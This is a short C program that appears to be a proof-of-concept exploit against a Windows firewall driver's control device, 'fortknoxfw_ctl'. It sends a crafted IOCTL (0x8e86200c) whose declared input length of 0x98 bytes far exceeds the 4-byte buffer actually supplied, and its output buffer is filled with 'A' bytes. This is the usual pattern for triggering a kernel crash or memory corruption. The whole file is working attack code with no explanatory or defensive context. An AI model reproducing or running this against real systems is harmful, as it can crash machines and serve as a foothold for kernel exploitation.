#include<stdio.h>
#include<windows.h>
#include<stdlib.h>
int main(int argc, char *argv[])
{
    BOOL res = FALSE;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    BYTE obuff[0x98];
    ULONG inputBuffer;
    DWORD bts;
    hDevice = CreateFile("\\\\.\\fortknoxfw_ctl",
        GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED
        ,NULL);
    if(hDevice == INVALID_HANDLE_VALUE){
        printf("(-)Failure while File Creation!");
        exit(0);
    }else{
        printf("(+) trying to send the IO Control code to the device ...");
        inputBuffer = 0;
        memset(obuff,0x41,0x98);
        res = DeviceIoControl(hDevice,0x8e86200c,&inputBuffer,0x98,obuff,0x98,&bts,NULL);
        if(res==FALSE)
            printf("Failed while DeviceIoControl");
    }
 
    return 0;
     
}
